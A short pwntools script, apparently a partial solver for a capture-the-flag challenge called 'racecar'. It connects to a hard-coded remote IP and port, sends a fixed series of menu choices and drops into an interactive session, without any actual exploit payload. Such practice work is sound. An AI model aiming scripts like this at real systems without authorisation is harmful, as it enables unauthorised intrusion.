from pwn import*
p = remote('167.99.207.165',32403)
#p = process("./racecar")

payload = b"2"
p.sendline(payload)

payload = b"2"
p.sendline(payload)

payload = b"2"
p.sendline(payload)

payload = b"2"
p.sendline(payload)

payload = b"1"
p.sendline(payload)
p.interactive()
